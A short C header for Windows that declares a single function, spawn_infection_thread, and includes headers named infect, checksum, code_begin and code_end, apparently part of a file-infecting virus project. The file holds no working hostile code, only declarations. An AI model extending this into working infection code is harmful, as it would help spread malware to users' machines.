#ifndef INFECTION_THREAD_H
#define INFECTION_THREAD_H

#include <stdint.h>
#include <stdio.h>
#include <windows.h>

#include "checksum.h"
#include "checksum_list.h"
#include "code_begin.h"
#include "code_end.h"
#include "data.h"
#include "infect.h"
#include "utility.h"

void spawn_infection_thread(void);

#endif
